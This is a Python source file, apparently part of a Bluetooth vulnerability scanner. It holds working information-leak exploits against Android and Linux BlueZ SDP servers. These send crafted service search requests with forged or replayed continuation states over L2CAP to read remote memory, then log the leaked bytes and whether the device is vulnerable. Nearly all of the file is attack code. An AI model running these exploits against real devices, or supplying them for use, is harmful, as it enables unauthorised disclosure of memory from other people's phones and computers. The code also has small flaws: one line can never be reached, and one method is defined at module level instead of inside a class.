import os
import sys
import time
import struct
import select
import bluetooth
import sql

from bluetooth import _bluetooth as bt
from scapy.layers.bluetooth import *
from pwn import *

# The bluez continuation state structure
class BlueZ_ContinuationState(Packet):
    fields_desc = [
        LEIntField("timestamp", 0),
        LEShortField("maxBytesSent", 0),
        LEShortField("lastIndexSent", 0),
    ]

# A SDP service search request with attributes
class SDP_ServiceSearchAttributeRequest(Packet):
    fields_desc = [
        ByteField("pdu_id",0x06),
        ShortField("transaction_id", 0x00),
        ShortField("param_len", 0),
        FieldListField("search_pattern", 0x00, ByteField("", None)),
        ShortField("max_attr_byte_count", 0),
        FieldListField("attr_id_list", 0x00, ByteField("", None)),
        ByteField("cont_state_len", 0),
    ]

def doInformationLeakAndroid(dst, SQL_ACTIVE):
    target = dst
    service_long = 0x0100
    service_short = 0x0001
    mtu = 50
    n = 30

    def packet(service, continuation_state):
        pkt = '\x02\x00\x00'
        pkt += p16(7 + len(continuation_state))
        pkt += '\x35\x03\x19'
        pkt += p16(service)
        pkt += '\x01\x00'
        pkt += continuation_state
        return pkt

    prog = log.progress('Connect to L2CAP and try android information leak!')

    try:
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        bluetooth.set_l2cap_mtu(sock, mtu)
        context.endian = 'big'

        sock.connect((target, 1))

        sock.send(packet(service_long, '\x00'))
        data = sock.recv(mtu)

        if data[-3] != '\x02':
            log.info("Not an android device! Invalid continuation state received.")
            if(SQL_ACTIVE == True):
                sql.updateDeviceState(dst, "Invalid continuation state received.")
            prog.success()
            return 3

        stack = ''
        
        for i in range(1, n):
            sock.send(packet(service_short, data[-3:]))
            data = sock.recv(mtu)
            stack += data[9:-3]

        sock.close()

        if(stack == ''):
            log.info("Got no Information! Device may not be vulnerable! Try the hard scan to confirm.")
            return 1
        else:
            log.info("Got the Information! Device is vulnerable!")
            return 2

        prog.success()
    except:
        log.info("Error in executing Information Leak!")
        if(SQL_ACTIVE == True):
            sql.updateDeviceState(dst, "Error in executing Information Leak")
        prog.success()
        return 0

def post_build(self, p, pay):
    if not self.param_len:
        p = p[:3]+struct.pack("!H", len(p[5:]) + len(pay))+p[5:]
    if not self.cont_state_len:
        p = p[:-1]+struct.pack("B", len(pay))
    return p + pay

def doInformationLeakLinux(dst):
    # Get the target from args and define an MTU
    target = dst
    mtu = 512

    try:
        # Create a L2CAP socket and connect to the target
        prog = log.progress("Connect to L2CAP")
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        bluetooth.set_l2cap_mtu(sock, mtu)
        sock.connect((target, 1))
        prog.success()

        # Send first SDP request to get host timestamp
        req1 = SDP_ServiceSearchAttributeRequest(search_pattern = [0x35, 0x03, 0x19, 0x01, 0x00],
                                    attr_id_list = [0x35, 0x05, 0x0a, 0x00, 0x00, 0x00, 0x01],
                                    max_attr_byte_count = 10)
        sock.send(bytes(req1))
        resp1 = sock.recv(mtu)

        # Parse the recieved contiunation state
        cont_state = resp1[-8:]
        host_timestamp = int(cont_state[:4].encode('hex'), 16)

        # Create malicious SDP requests by adding forged continuation state
        received_data = b''
        offset = 65535

        prog = log.progress("Try "+str(offset)+" different offsets...")
        while offset > 0:
            req2 = SDP_ServiceSearchAttributeRequest(search_pattern = [0x35, 0x03, 0x19, 0x01, 0x00],
                                        attr_id_list = [0x35, 0x05, 0x0a, 0x00, 0x00, 0x00, 0x01],
                                        max_attr_byte_count = 65535)
            forged_cont_state = BlueZ_ContinuationState(timestamp = host_timestamp, 
                                        maxBytesSent = offset) 
            req2 = req2 / forged_cont_state
            sock.send(bytes(req2))

            data = sock.recv(mtu)
            data = data[7:] # Remove SDP params
            data = data[:-9] # Remove continuation state
            received_data = data + received_data
            if len(data) > 0:
                log.info("Got the Information! Device is vulnerable!") 
                prog.success()
                return
            else:
                offset -= 1

        if(len(received_data) > 0):
            log.info("Got the Information! Device is vulnerable!")
            log.info(hexdump(received_data))
            prog.success()
        else:
            log.info("Got no Information! Device may not be vulnerable! Try the hard scan to confirm.")
            prog.success()
    except Exception as e:
        print("Error in Linux InformationLeak!")
        print(e)
